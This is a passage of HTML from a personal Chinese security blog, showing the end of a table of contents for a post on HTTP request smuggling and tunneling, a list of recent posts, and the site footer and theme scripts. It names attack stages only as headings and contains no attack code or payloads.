href="#2-%E5%88%86%E6%9E%90%E5%93%8D%E5%BA%94"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 分析响应</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.6.</span> <span class="toc-text">🛡️ 防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">📌 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9C%E9%9A%A7%E9%81%93%E2%80%9D%EF%BC%88Tunneling%EF%BC%89%EF%BC%9F"><span class="toc-number">1.7.1.</span> <span class="toc-text">1. 什么是“隧道”（Tunneling）？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%E4%B8%AD%E7%9A%84%E9%9A%A7%E9%81%93%E4%BD%93%E7%8E%B0"><span class="toc-number">1.8.</span> <span class="toc-text">📌 攻击步骤中的隧道体现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B51%EF%BC%9ACRLF%E6%B3%A8%E5%85%A5%EF%BC%88%E7%A1%AE%E8%AE%A4%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.8.1.</span> <span class="toc-text">阶段1：CRLF注入（确认漏洞）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B52%EF%BC%9A%E6%9E%84%E9%80%A0POST%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E8%AE%A4%E8%AF%81%E5%A4%B4"><span class="toc-number">1.8.2.</span> <span class="toc-text">阶段2：构造POST请求走私认证头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B53%EF%BC%9A%E6%9E%84%E9%80%A0HEAD%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E8%AE%BF%E9%97%AE-admin"><span class="toc-number">1.8.3.</span> <span class="toc-text">阶段3：构造HEAD请求隧道访问&#x2F;admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B54%EF%BC%9A%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%EF%BC%88%E6%9C%80%E7%BB%88%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.8.4.</span> <span class="toc-text">阶段4：删除用户（最终攻击）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%B0-%E7%94%9F%E6%B4%BB%E5%8C%96%E7%B1%BB%E6%AF%94"><span class="toc-number">1.9.</span> <span class="toc-text">🌰 生活化类比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E6%80%BB%E7%BB%93%EF%BC%9A%E9%9A%A7%E9%81%93%E7%9A%84%E5%85%B3%E9%94%AE%E7%89%B9%E5%BE%81"><span class="toc-number">1.10.</span> <span class="toc-text">🔍 总结：隧道的关键特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A1-%E5%BF%AB%E9%80%9F%E8%87%AA%E6%9F%A5%EF%BC%9A%E5%93%AA%E9%87%8C%E7%94%A8%E5%88%B0%E4%BA%86%E9%9A%A7%E9%81%93%EF%BC%9F"><span class="toc-number">1.11.</span> <span class="toc-text">⚡ 快速自查：哪里用到了隧道？</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/25/%E8%87%AA%E5%B7%B1%E5%81%9A%E7%9A%84%E7%AE%80%E6%B4%81%E6%80%BB%E7%BB%93(webshell%E6%B5%81%E9%87%8F&amp;%E5%88%A4%E6%96%AD%E5%91%8A%E8%AD%A6%E6%98%AF%E5%90%A6%E8%AF%AF%E6%8A%A5%E7%9A%84%E6%80%9D%E8%B7%AF)/" title="蓝初流量检测的webshell特征总结和误判思路"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E9%9D%92%E7%9E%B3%E7%8C%AB.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝初流量检测的webshell特征总结和误判思路"/></a><div class="content"><a class="title" href="/2025/05/25/%E8%87%AA%E5%B7%B1%E5%81%9A%E7%9A%84%E7%AE%80%E6%B4%81%E6%80%BB%E7%BB%93(webshell%E6%B5%81%E9%87%8F&amp;%E5%88%A4%E6%96%AD%E5%91%8A%E8%AD%A6%E6%98%AF%E5%90%A6%E8%AF%AF%E6%8A%A5%E7%9A%84%E6%80%9D%E8%B7%AF)/" title="蓝初流量检测的webshell特征总结和误判思路">蓝初流量检测的webshell特征总结和误判思路</a><time datetime="2025-05-25T04:00:00.000Z" title="发表于 2025-05-25 12:00:00">2025-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/" title="请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E5%8F%AF%E5%8F%AF%E8%90%9D.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)"/></a><div class="content"><a class="title" href="/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/" title="请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)">请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)</a><time datetime="2025-05-25T04:00:00.000Z" title="发表于 2025-05-25 12:00:00">2025-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/10/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="适用场景比较广泛的条件竞争脚本"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/photo1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="适用场景比较广泛的条件竞争脚本"/></a><div class="content"><a class="title" href="/2025/05/10/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="适用场景比较广泛的条件竞争脚本">适用场景比较广泛的条件竞争脚本</a><time datetime="2025-05-10T04:00:00.000Z" title="发表于 2025-05-10 12:00:00">2025-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/" title="spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/photo1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)"/></a><div class="content"><a class="title" href="/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/" title="spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)">spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)</a><time datetime="2025-03-09T04:00:00.000Z" title="发表于 2025-03-09 12:00:00">2025-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/" title="【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/archive.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。"/></a><div class="content"><a class="title" href="/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/" title="【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。">【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。</a><time datetime="2024-07-07T04:00:00.000Z" title="发表于 2024-07-07 12:00:00">2024-07-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/可可萝.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By han</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="10051718332" data-server="netease" data-type="playlist" data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>